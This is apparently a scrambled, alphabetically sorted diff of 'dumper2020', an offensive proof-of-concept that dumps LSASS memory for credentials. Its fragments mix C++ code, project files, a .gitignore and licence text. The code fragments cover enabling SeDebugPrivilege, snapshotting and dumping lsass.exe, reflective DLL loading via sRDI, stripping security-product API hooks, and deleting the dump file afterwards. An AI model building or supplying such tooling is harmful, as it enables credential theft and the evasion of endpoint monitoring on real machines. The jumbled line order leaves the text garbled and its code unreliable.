+"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR "
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR "
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"] Captured snapshot of LSASS process"" << endl"
+"] Dump complete"" << endl"
+"] Dumping to: "" << dumpPath << endl"
+"] Enabled SeDebugPrivilege"" << endl"
+"] Removed dump file"" << endl"
+"] SeDebugPrivilege already enabled"" << endl"
+"] Successfully opened LSASS, PID: "" << lsassPid << endl"
+"a computer network, with no transfer of a copy, is not conveying."
+"above cannot be given local legal effect according to their terms,"
+"actual knowledge that, but for the patent license, your conveying the"
+"actually uses, or expects or is expected to use, the product.  A product"
+"add to a covered work, you may (if authorized by the copyright holders of"
+"additional permissions on material, added by you to a covered work,"
+"additional terms that apply to those files, or a notice indicating"
+"agreement or commitment, however denominated, not to enforce a patent"
+"and control, on terms that prohibit them from making any copies of"
+"and which are not combined with it such as to form a larger program,"
+"any patent claim is infringed by making, using, selling, offering for"
+"apply only to part of the Program, that part may be used separately"
+"arrangement, you convey, or propagate by procuring conveyance of, a"
+"authors' sake, the GPL requires that modified versions be marked as"
+"available, or (2) arrange to deprive yourself of the benefit of the"
+"be similar in spirit to the present version, but may differ in detail to"
+"be treated as though they were included in this License, to the extent"
+"but the special requirements of the GNU Affero General Public License,"
+"by this License, of making, using, or selling its contributor version,"
+"bytesRequired, LIST_MODULES_DEFAULT)))"
+"callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION))"
+"certain responsibilities if you distribute copies of the software, or if"
+"changed, so that their problems will not be attributed erroneously to"
+"combined work, and to convey the resulting work.  The terms of this"
+"commercial, industrial or non-consumer uses, unless such uses represent"
+"computer or modifying a private copy.  Propagation includes copying,"
+"consistent with the requirements of this License, to extend the patent"
+"contain the covered work, unless you entered into that arrangement,"
+"content, constitutes a covered work.  This License acknowledges your"
+"contents, DWORD "
+"contents, size, 1, fp)"
+"control those activities.  However, it does not include the work's"
+"convey, without conditions so long as your license otherwise remains"
+"conveyed by you (or copies made from those copies), or (b) primarily"
+"copyright holder, and you cure the violation prior to 30 days after"
+"copyright on the Program, and are irrevocable provided the stated"
+"covered work in a country, or your recipient's use of the covered work"
+"covered work is covered by this License only if the output, given its"
+"covered work, and grant a patent license to some of the parties"
+"covered work, you indicate your acceptance of this License to do so."
+"define RVA(type, base, rva) (type)((ULONG_PTR) base "
+"distribution (with or without modification), making available to the"
+"dllBytes, dllSize))"
+"dllOffset, sizeof(dllOffset))"
+"dumper2020.vcxproj"", ""{D8091ED0-5E78-4AF5-93EE-A5AA6E978430}"""
+"dumper2020_dll.vcxproj"", ""{84A7E50E-B0F0-4B3D-98CD-F32CDB1EB8CA}"""
+"dumper2020_exe.vcxproj"", ""{B7355478-EEE0-46A7-807A-23CF0C5295AE}"""
+"earlier work or a work ""based on"" the earlier work."
+"exact copy.  The resulting work is called a ""modified version"" of the"
+"extent that warranties are provided), that licensees may convey the"
+"feature that (1) displays an appropriate copyright notice, and (2)"
+"file, FILE_GENERIC_WRITE, "
+"fileObjectAttributes, "
+"finally terminates your license, and (b) permanently, if the copyright"
+"fixed term (regardless of how the transaction is characterized), the"
+"flags, sizeof(flags))"
+"for a work that has been modified or installed by the recipient, or for"
+"for making modifications to it.  ""Object code"" means any non-source"
+"for you must do so exclusively on your behalf, under your direction"
+"form of a separately written license, or stated as exceptions"
+"fp, filename, ""rb"")"
+"free programs, and that you know you can do these things."
+"freedoms that you received.  You must make sure that they, too, receive"
+"from the Corresponding Source as a System Library, need not be"
+"give under the previous paragraph, plus a right to possession of the"
+"giving you legal permission to copy, distribute and/or modify it."
+"gratis or for a fee, you must pass on to the recipients the same"
+"handle, PROCESS_CREATE_PROCESS "
+"hereafter acquired, that would be infringed by some manner, permitted"
+"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
+"in a country, would infringe one or more identifiable patents in that"
+"in a fashion requiring copyright permission, other than the making of an"
+"in or on a volume of a storage or distribution medium, is called an"
+"in the business of distributing software, under which you make payment"
+"include ""../dumper2020/dumper2020.h"""
+"include ""dumper2020.h"""
+"include ""hooks.h"""
+"include ""proto.h"""
+"include ""srdi.h"""
+"include ""whisper.h"""
+"infringement under applicable copyright law, except executing it on a"
+"interfaces specified for a particular programming language, one that"
+"into a dwelling.  In determining whether a product is a consumer product,"
+"into proprietary programs.  If your program is a subroutine library, you"
+"ioStatusBlock, 0, FILE_ATTRIBUTE_NORMAL,"
+"ioStatusBlock, sizeof(ioStatusBlock))"
+"license to downstream recipients.  ""Knowingly relying"" means you have"
+"linked subprograms that the work is specifically designed to require,"
+"log.txt"")"
+"lsassString, L""lsass.exe"")"
+"lsassString, TRUE))"
+"machine-readable Corresponding Source under the terms of this License,"
+"make it effectively proprietary.  To prevent this, the GPL assures that"
+"make, use, sell, offer for sale, import and otherwise run, modify and"
+"masm.props"" />"
+"masm.targets"" />"
+"mbi, sizeof(mbi))"
+"menu, a prominent item in the list meets this criterion."
+"modification of the work as a means of enforcing, against the work's"
+"modified object code on the User Product (for example, the work has"
+"modified versions of the software inside them, although the manufacturer"
+"modify it is void, and will automatically terminate your rights under"
+"must place, in the relevant source files, a statement of the"
+"not accept this License.  Therefore, by modifying or propagating a"
+"not convey it at all.  For example, if you agree to terms that obligate you"
+"not impose a license fee, royalty, or other charge for exercise of"
+"oa, "
+"of having them make modifications exclusively for you, or provide you"
+"of sections 4 and 5, provided that you also convey the"
+"of that license document, provided that the further restriction does"
+"of the GPL, as needed to protect the freedom of users."
+"or convey a specific copy of the covered work, then the patent license"
+"or household purposes, or (2) anything designed or sold for incorporation"
+"or that patent license was granted, prior to 28 March 2007."
+"organization, or merging organizations.  If propagation of a covered"
+"organization, or substantially all assets of one, or subdividing an"
+"otherwise) that contradict the conditions of this License, they do not"
+"outBytes, DWORD "
+"owned or controlled by the contributor, whether already acquired or"
+"pBuffer, "
+"pPage, "
+"packaging a Major Component, but which is not part of that Major"
+"pageSize, PAGE_EXECUTE_READWRITE, "
+"pageSize, PAGE_READWRITE, "
+"pageSize, dwProtection, "
+"parties who would receive the covered work from you, a discriminatory"
+"parts of the General Public License.  Of course, your program's commands"
+"patent license for this particular work, or (3) arrange, in a manner"
+"patent license under the contributor's essential patent claims, to"
+"pathString, OBJ_CASE_INSENSITIVE, NULL, NULL)"
+"pathString, ntPath.data())"
+"permission, would make you directly or secondarily liable for"
+"permissions.  However, no additional obligations are imposed on any"
+"possible use to the public, the best way to achieve this is to make it"
+"procedures, authorization keys, or other information required to install"
+"processInfo->ProcessName, "
+"produce it from the Program, in the form of source code under the"
+"produce the work, or an object code interpreter used to run it."
+"product received by a particular user, ""normally used"" refers to a"
+"products.  If such problems arise substantially in other domains, we"
+"propagate that work, subject to this License.  You are not responsible"
+"provisionally, unless and until the copyright holder explicitly and"
+"public, and in some countries other activities as well."
+"publicly available network server or other readily accessible means,"
+"purposes of this definition, ""control"" includes the right to grant"
+"receive it, in any medium, provided that you conspicuously and"
+"received it, or any part of it, contains a notice stating that it is"
+"receives a license from the original licensors, to run, modify and"
+"receiving the covered work authorizing them to use, propagate, modify"
+"reinstated, you do not qualify to receive new licenses for the same"
+"remove any additional permissions from that copy, or from any part of"
+"requirement to continue to provide support service, warranty, or updates"
+"restriction, you may remove that term.  If a license document contains"
+"restrictions"" within the meaning of section 10.  If the Program as you"
+"rights granted or affirmed under this License.  For example, you may"
+"rights granted under this License, and you may not initiate litigation"
+"rights of fair use or other equivalent, as provided by copyright law."
+"sale, or importing the Program or any portion of it."
+"section 13, concerning interaction through a network will apply to the"
+"setup_error_log.txt"")"
+"software for all its users.  We, the Free Software Foundation, use the"
+"software on general-purpose computers, but in those that do, we wish to"
+"source code form), and must require no special password or key for"
+"specifically for use in, a User Product, and the conveying occurs as"
+"standard defined by a recognized standards body, or, in the case of"
+"sue for patent infringement).  To ""grant"" such a patent license to a"
+"tangible personal property which is normally used for personal, family,"
+"terms of section 4, provided that you also meet all of these conditions:"
+"than the work as a whole, that (a) is included in the normal form of"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the Program, the only way you could satisfy both those terms and this"
+"the covered work, and you disclaim any intention to limit operation or"
+"the interface presents a list of user commands or options, such as a"
+"the library.  If this is what you want to do, use the GNU Lesser General"
+"the scope of its coverage, prohibits the exercise of, or is"
+"the source code needed to generate, install, and (for an executable"
+"the work, and the source code for shared libraries and dynamically"
+"the work, and under which the third party grants, to any of the"
+"them if you wish), that you receive source code or can get it if you"
+"these rights or asking you to surrender the rights.  Therefore, you have"
+"to copy, free of charge and under the terms of this License, through a"
+"to receive a copy likewise does not require acceptance.  However,"
+"to take away your freedom to share and change the works.  By contrast,"
+"tokenElevation, sizeof(tokenElevation), "
+"typical or common use of that class of product, regardless of the status"
+"under those permissions, but the entire Program remains governed by"
+"unpacking, reading or copying."
+"use, which is precisely where it is most unacceptable.  Therefore, we"
+"userDataLocation, sizeof(userDataLocation))"
+"userFunction, sizeof(userFunction))"
+"userSize, sizeof(userSize))"
+"users, your or third parties' legal rights to forbid circumvention of"
+"versions of the GNU General Public License can be used, that proxy's"
+"violation by some reasonable means, this is the first time you have"
+"want it, that you can change the software or use pieces of it in new"
+"wcscat_s(dumpPath, MAX_PATH, L"""
+"which are not part of the work.  For example, Corresponding Source"
+"with facilities for running those works, provided that you comply with"
+"work results from an entity transaction, each party to that"
+"work thus licensed is called the contributor's ""contributor version""."
+"work under this License, and how to view a copy of this License.  If"
+"work) run the object code and to modify the work, including scripts to"
+"works, such as semiconductor masks."
+"works, which are not by their nature extensions of the covered work,"
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"xC3"""
+"xml version=""1.0"" encoding=""utf-8"""
+"your programs, too."
+"} HOOKED_FUNCTION, "
+"} LOADED_MODULE, "
+"} SYSTEM_PROCESSES, "
+$(Configuration)
+$(Platform)'=='Debug
+$(Platform)'=='Release
+$tf/
+%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+(BYTE 
+(DWORD 
+(PULONG)(KUSER_SHARED_DATA 
+(WORD 
+(including a cross-claim or counterclaim in a lawsuit) alleging that
+(such as an express permission to practice a patent or covenant not to
+)(name)
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+.DS_Store
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.app
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cachefile
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dll
+.dotCover
+.dylib
+.e2e
+.exe
+.fake/
+.gch
+.gpState
+.hhc
+.hhk
+.hhp
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.json
+.lai
+.ldf
+.lib
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.mod
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.out
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.slo
+.smod
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbw
+.vs/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+//              https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
+// - Address:      The address of the function.
+// - FreshBytes:   Fresh copy of the function stub from disk.
+// - Handle:          Handle to the function's module.
+// - HookedFunctions: Array of hooked functions.
+// - ModuleHandle: Handle to the function's module.
+// - Ordinal:      The ordinal number of the function.
+// - Path:            File path of module.
+// Arguments:   Char array containing path to DLL
+// Arguments:   Handle to a DLL loaded via sRDI and the function name
+// Arguments:   Pointer to a hooked function struct
+// Arguments:   Pointer to a loaded module struct
+// Arguments:   Pointer to wide char array containing destination file path
+// Arguments:   Pointer to wide char array containing dump file path
+// Arguments:   Pointer to wide char array containing path to file to delete
+// Arguments:   Target process PID
+// Called from: ConvertToShellcode
+// Called from: Dump
+// Called from: GetMiniDumpWriteDump
+// Called from: LoadDLL
+// Called from: PatchHooks
+// Called from: dumper2020!Dump
+// Called from: dumper2020!GetMiniDumpWriteDump
+// Called from: main/DllMain
+// Describes:   A hooked function.
+// Describes:   A loaded module.
+// Description: Checks a given module for hooked functions by comparing against a fresh copy
+// Description: Construct path to DLL exporting MiniDumpWriteDump based on Windows version
+// Description: Convert DLL from disk into an sRDI blob in memory
+// Description: Create dump file at specified location
+// Description: Delete dump file
+// Description: Dump LSASS process memory to disk
+// Description: Enumerate loaded modules in the current process
+// Description: Get PID for lsass.exe
+// Description: Get Windows major version from KUSER_SHARED_DATA
+// Description: Get pointer to a function in a DLL loaded via sRDI
+// Description: Open handle to the target process with minimum rights needed to perform a memory dump
+// Description: Perform sRDI and load specified DLL
+// Description: Read contents of file from disk
+// Description: Remove all function hooks in loaded modules
+// Description: Resolve addresses for NTDLL/Kernel32 functions
+// Description: This function tells MiniDumpWriteDump that a PSS snapshot is being dumped
+// Description: Unhooks a function using bytes collected from a fresh copy
+// Function:    ATPMiniDumpWriteDumpCallback
+// Function:    CheckModuleForHooks
+// Function:    ConvertToShellcode
+// Function:    CreateDumpFile
+// Function:    DeleteDumpFile
+// Function:    Dump
+// Function:    GetDebugDLLPath
+// Function:    GetFileContents
+// Function:    GetHandle
+// Function:    GetModules
+// Function:    GetPid
+// Function:    GetProcAddressR
+// Function:    GetWinVersion
+// Function:    LoadDLL
+// Function:    PatchHooks
+// Function:    Requirements
+// Function:    ResolveFunctions
+// Function:    RestoreHookedFunction
+// Global functions
+// Members:
+// MiniDumpWriteDump prototype
+// PSS snapshot functions
+// RTL function prototypes
+// Returns:     Handle to loaded DLL for use with GetProcAddressR
+// Returns:     Path to debug DLL
+// Returns:     Pointer to the requested function if found
+// Returns:     True if dump was successful
+// Returns:     True if successful
+// Returns:     True if the function was successfully patched/unhooked
+// Returns:     True if there are hooked functions in the module
+// Returns:     True on success
+// Source:      https://gist.github.com/slaeryan/2c73c4c4e33dfd7d8ce38312aacc9324
+// Source:      https://github.com/jthuraisamy/TelemetrySourcerer/
+// Source:      https://github.com/monoxgas/sRDI
+// Sources:     https://github.com/b4rtik/ATPMiniDump
+// Struct:      HOOKED_FUNCTION
+// Struct:      LOADED_MODULE
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+</OutDir>
+</Project>
+<http://www.gnu.org/licenses/>.
+<http://www.gnu.org/philosophy/why-not-lgpl.html>.
+= SE_PRIVILEGE_ENABLED
+= path
+= sizeof(dllOffset)
+= sizeof(flags)
+= sizeof(userDataLocation)
+= sizeof(userFunction)
+= sizeof(userSize)
+APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
+ASALocalRun/
+Additional permissions that are applicable to the entire Program shall
+All other works under this project are licensed under GNU GPLv3
+All rights reserved.
+Also add information on how to contact you by electronic and paper mail.
+AppPackages/
+AutoTest.Net/
+BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
+BOOL CheckModuleForHooks(PLOADED_MODULE module)
+BOOL CheckModuleForHooks(PLOADED_MODULE pModule)
+BOOL DeleteDumpFile(LPWSTR path)
+BOOL Dump(LPWSTR dumpPath)
+BOOL Requirements()
+BOOL ResolveFunctions()
+BOOL RestoreHookedFunction(PHOOKED_FUNCTION hookedFunction)
+BOOL RestoreHookedFunction(PHOOKED_FUNCTION pHookedFunction)
+Backup
+BenchmarkDotNet.Artifacts/
+BuildCustomizations
+BundleArtifacts/
+ClientBin/
+Corresponding Source conveyed under this section must be accompanied
+DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
+DECLARE_HANDLE(HPSS)
+DUMPER2020DLL_EXPORTS
+DUMPER2020_EXPORTS
+DWORD GetModules(HMODULE
+DWORD GetPid()
+DWORD GetWinVersion()
+DWORD snapshotFlags = PSS_CAPTURE_VA_CLONE
+Debug
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
+EndGlobal
+EndGlobalSection
+EndProject
+EndProjectSection
+FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
+FakesAssemblies/
+FodyWeavers.xsd
+Foundation.  If the Program does not specify a version number of the
+GNU General Public License for most of our software
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HANDLE CreateDumpFile(LPWSTR path)
+HANDLE GetHandle(DWORD dwPid)
+HANDLE GetHandle(DWORD pid)
+HMODULE LoadDLL(LPSTR dllPath)
+HideSolutionNode = FALSE
+License by making exceptions from one or more of its conditions.
+License of the Program or a work on which the Program is based.  The
+License would be to refrain entirely from conveying the Program.
+MigrationBackup/
+MiniDumpWriteDump
+MinimumVisualStudioVersion = 10.0.40219.1
+NDEBUG
+NtAdjustPrivilegesToken
+NtClose
+NtCreateFile
+NtDeleteFile
+NtOpenProcess
+NtOpenProcessToken
+NtProtectVirtualMemory
+NtQueryInformationToken
+NtQuerySystemInformation
+NtReadVirtualMemory
+NtWriteVirtualMemory
+OpenCover/
+PHOOKED_FUNCTION
+PIC_BindShell primitives and related works are released under the license below.
+PLOADED_MODULE
+POSSIBILITY OF SUCH DAMAGE.
+PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
+Package.StoreAssociation.xml
+Program specifies that a certain numbered version of the GNU General
+ProjectSection(ProjectDependencies) = postProject
+PssCaptureSnapshot
+PublishScripts/
+Reflective DLL Injection primitives and related works are released under the license below.
+Release
+SERVICES
+SUCH DAMAGES.
+ScaffoldingReadMe.txt
+ServiceFabricBackup/
+SolutionGuid = {DA66AA28-B2EC-4DF5-BEEE-9DC56CF08CF7}
+Source.
+States should not allow patents to restrict development and use of
+StyleCopReport.xml
+THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+TelemetrySourcerer is released under the following license:
+Temp
+TestResult.xml
+The dumper2020 solution consists of three projects:
+The hypothetical commands 
+UNICODE
+USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
+UpgradeLog
+User Product is transferred to the recipient in perpetuity or for a
+VOID PatchHooks()
+VisualStudioVersion = 16.0.30503.244
+WCHAR dumpPath[MAX_PATH]
+Win32
+Windows
+Yet another proof-of-concept for an LSASS memory dumper. This one incorporates established techniques and attempts to neutralize all user-land API hooks before dumping LSASS.
+[@Cneelis](https://twitter.com/Cneelis)
+[@Jackson_T](https://twitter.com/Jackson_T)
+[@SpecialHoang](https://twitter.com/SpecialHoang)
+[@b4rtik](https://twitter.com/b4rtik)
+[@matteomalvica](https://twitter.com/matteomalvica)
+[@monoxgas](https://twitter.com/monoxgas)
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+] = (BYTE)(sizeof(bootstrap) - i - 4)
+] = 0x00
+] = 0x24
+] = 0x41
+] = 0x44
+] = 0x48
+] = 0x49
+] = 0x56
+] = 0x59
+] = 0x5e
+] = 0x81
+] = 0x83
+] = 0x89
+] = 0xC7
+] = 0xb9
+] = 0xba
+] = 0xc0
+] = 0xc1
+] = 0xc3
+] = 0xc8
+] = 0xe4
+] = 0xe6
+] = 0xe8
+] = 0xec
+] = 0xf0
+] = 0xf4
+] = 4 
+] = 6 
+_CONSOLE
+_Chutzpah
+_DEBUG
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_USRDLL
+_UpgradeReport_Files/
+_WINDOWS
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+a further restriction but permits relicensing or conveying under this
+a modified version of its Corresponding Source.  The information must
+address new problems or concerns.
+advapi32.lib
+adversely affects the operation of the network or violates the rules and
+an absolute waiver of all civil liability in connection with the
+and execute modified versions of a covered work in that User Product from
+and the Corresponding Source of the work is not available for anyone
+and you may offer support or warranty protection for a fee.
+any implied license or other defenses to infringement that may
+any other work released this way by its authors.  You can apply it to
+appropriately publish on each copy an appropriate copyright notice
+artifacts/
+asmx</Extensions>
+author or copyright holder as a result of your choosing to follow a
+authors of previous versions.
+avoid the special danger that patents applied to a free program could
+been installed in ROM).
+beyond what the individual works permit.  Inclusion of a covered work
+bld/
+bower_components/
+but do not include claims that would be infringed only as a
+by the Free Software Foundation.
+by the Installation Information.  But this requirement does not apply
+callbackInfo)))
+can do so.  This is fundamentally incompatible with the aim of
+can regenerate automatically from other parts of the Corresponding
+cbWritten) == 0)
+cid)
+circumvention of technological measures to the extent such circumvention
+code is in no case prevented or interfered with solely because
+combination as such.
+conditioned on the non-exercise of one or more of the rights that are
+conditions and the following disclaimer in the documentation and/or other materials provided 
+conditions and the following disclaimer.
+conditions are met.  This License explicitly affirms your unlimited
+consequence of further modification of the contributor version.  For
+contents = (LPSTR)malloc(size 
+copy of the Program in return for a fee.
+country that you have reason to believe are valid.
+coverage
+covered work so as to satisfy simultaneously your obligations under this
+crunch
+csx/
+define DEREF_16( name )
+define DEREF_32( name )
+define DEREF_8( name )
+define FILE_CREATE 2
+define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
+define KUSER_SHARED_DATA 0x7ffe0000
+define MAJOR_VERSION_OFFSET 0x026C
+define OBJ_CASE_INSENSITIVE 0x00000040L
+define PATCH_SIZE 16
+define SRDI_CLEARHEADER 0x1
+define SRDI_CLEARMEMORY 0x2
+define SRDI_OBFUSCATEIMPORTS 0x4
+dlldata.c
+documented (and with an implementation available to the public in
+doubtful cases shall be resolved in favor of coverage.  For a particular
+dumpPath[0])
+dumper2020
+dumper2020.lib</AdditionalDependencies>
+dumper2020_dll
+dumper2020_exe
+dwProtection) == 0)
+ecf/
+endif
+endorse or promote products derived from this software without specific prior written permission.
+excuse you from the conditions of this License.  If you cannot convey a
+expName)
+expOrdinal 
+fileObjectAttributes) != 0)
+fnMiniDumpWriteDump GetMiniDumpWriteDump()
+fnPssCaptureSnapshot PssCaptureSnapshot
+fnPssFreeSnapshot PssFreeSnapshot
+fnRtlEqualUnicodeString RtlEqualUnicodeString
+fnRtlInitUnicodeString RtlInitUnicodeString
+for and in connection with specific products or compilations that
+for enforcing compliance by third parties with this License.
+for which you have or can give appropriate copyright permission.
+form of a work.
+free software which everyone can redistribute and change under these terms.
+governed by this License along with a term that is a further
+have designed this version of the GPL to prohibit the practice for those
+have the freedom to distribute copies of free software (and charge for
+healthchecksdb
+holder fails to notify you of the violation by some reasonable means
+if (ul_reason_for_call != DLL_PROCESS_ATTACH)
+if neither you nor any third party retains the ability to install
+ifndef __WINDEF_
+ifndef __wtypes_h__
+implementation is available to the public in source code form.  A
+in accord with this section must be in a format that is publicly
+in an aggregate does not cause this License to apply to the other
+in force.  You may convey covered works to others for the sole purpose
+in one of these ways:
+include <DbgHelp.h>
+include <Psapi.h>
+include <iostream>
+include <stdio.h>
+include <string>
+include <vector>
+include <windef.h>
+include <wtypes.h>
+included in conveying the object code work.
+includes interface definition files associated with source files for
+int main()
+ipch/
+is a consumer product regardless of whether the product has substantial
+is effected by exercising rights under this License with respect to
+is widely used among developers working in that language.
+issue-259490424)
+issuecomment-104372622)
+it.  (Additional permissions may be written to require their own
+itr)
+itr))
+jpeg
+keep intact all notices of the absence of any warranty
+keep intact all notices stating that this License and any
+kernel32.lib
+know their rights.
+later version.
+license from a particular copyright holder is reinstated (a)
+licenses of parties who have received copies or rights from you under
+licenses to the work the party's predecessor in interest had or could
+log.txt
+makes it unnecessary.
+material under section 10.
+may consider it more useful to permit linking proprietary applications with
+measure under any applicable law fulfilling obligations under article
+measures.
+mfcribbon-ms</Extensions>
+might be different
+modification follow.
+modification has been made.
+modify any covered work.  These actions infringe copyright if you do
+mono_crash.
+nCrunchTemp_
+network may be denied when the modification itself materially and
+node_modules/
+non-permissive terms added in accord with section 7 apply to the code
+not control copyright.  Those thus making or running the covered works
+not survive such relicensing or conveying.
+nothing other than this License grants you permission to propagate or
+notice like this when it starts in an interactive mode:
+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+nunit-
+occurring solely as a consequence of using peer-to-peer transmission
+of the particular user or of the way in which the particular user
+oldProtect) == 0) {
+on the Program.
+option of following the terms and conditions either of that numbered
+or can get the source code.  And you must show them these terms so they
+orleans.codegen.cs
+otherwise be available to you under applicable patent law.
+outSize)
+paket-files/
+paragraph of section 11).
+part of a transaction in which the right of possession and use of the
+parties to make or receive copies.  Mere interaction with a user through
+parts of the aggregate.
+party means to make such an agreement or commitment not to enforce a
+patent against the party.
+patent license (a) in connection with copies of the covered work
+patent sublicenses in a manner consistent with the requirements of
+patents cannot be used to render the program non-free.
+pattern of such abuse occurs in the area of products for individuals to
+permission to link or combine any covered work with a work licensed
+permission to run the unmodified Program.  The output from running a
+pragma once
+price.  Our General Public Licenses are designed to make sure that you
+prior to 60 days after the cessation.
+processInfoSize) == 0)
+processInfoSize) == 0xC0000004)
+programs which are used unmodified in performing those activities but
+project.fragment.lock.json
+project.lock.json
+propagate the contents of its contributor version.
+protecting users' freedom to change the software.  The systematic
+protocols for communication across the network.
+provided that the following conditions are met:
+provided under this License.  Any attempt otherwise to propagate or
+public statement of acceptance of a version permanently authorizes you
+publish/
+rcf/
+received notice of violation of this License (for any work) from that
+recipients a copy of this License along with the Program.
+reinstated permanently if the copyright holder notifies you of the
+removal in certain cases when you modify the work.)  You may place
+resx
+return Dump((LPWSTR)dumpPath)
+return TRUE
+reviewing courts shall apply local law that most closely approximates
+run a copy of the Program.  Ancillary propagation of a covered work
+same work.
+setup_error_log.txt
+share and change all versions of a program--to make sure it remains free
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+similar laws prohibiting or restricting circumvention of such
+size)
+snapshot)) == ERROR_SUCCESS)
+software and other kinds of works.
+specifically granted under this License.  You may not convey a covered
+stand ready to extend this provision to those domains in future versions
+state the exclusion of warranty
+std::string GetDebugDLLPath()
+string GetDebugDLLPath()
+subprograms and other parts of the work.
+such as by intimate data communication or control flow between those
+suffice to ensure that the continued functioning of the modified object
+sysInfo)
+system32
+technological measures.
+tells the user that there is no warranty for the work (except to the
+that material) supplement the terms of this License with terms:
+that there is no warranty for this free software.  For both users' and
+that they are valid under applicable law.  If additional permissions
+the GNU General Public License from time to time.  Such new versions will
+the GNU General Public License is intended to guarantee your freedom to
+the User Product in which it has been modified or installed.  Access to a
+the above requirements apply either way.
+the conditions stated below.  Sublicensing is not allowed
+the only significant mode of use of the product.
+the predecessor has it or can get it with reasonable efforts.
+the terms of this License in conveying all material for which you do
+then you must either (1) cause the Corresponding Source to be so
+this License (including any patent licenses granted under the third
+this License without regard to the additional permissions.
+this License.
+this License.  If your rights have been terminated and not permanently
+tiff
+to attach them to the start of each source file to most effectively
+to choose that version for the Program.
+to collect a royalty for further conveying from those to whom you convey
+to the extent that it includes a convenient and prominently visible
+to the third party based on the extent of your activity of conveying
+token) == 0)
+tokenElevationSize) == 0)
+tokenPrivsSize) == 0)
+tokenPrivsSize) == 0xC0000023)
+transaction who receives a copy of the work also receives whatever
+typedef BOOL(WINAPI
+typedef DWORD(WINAPI
